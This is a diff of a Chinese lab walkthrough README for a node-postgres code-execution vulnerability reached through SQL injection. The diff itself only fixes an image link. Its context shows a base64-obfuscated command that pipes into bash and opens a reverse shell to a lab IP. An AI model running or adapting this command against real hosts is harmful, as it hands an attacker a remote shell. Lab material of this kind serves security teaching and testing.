@@ -21,7 +21,7 @@ docker-compose up -d
 
 成功运行后，访问`http://your-ip:3000/?id=1`即可查看到id为1的用户信息，用sqlmap即可发现此处存在注入点，且数据库为postgres：
 
-[](img/1.png)
+![](img/1.png)
 
 那么，我们就可以猜测这里存在node-postgres的代码执行漏洞。编写我想执行的命令`echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTkuMC4xLzIxIDA+JjE=|base64 -d|bash`，然后适当分割（每段长度不超过64字符）后替换在如下payload中：
 
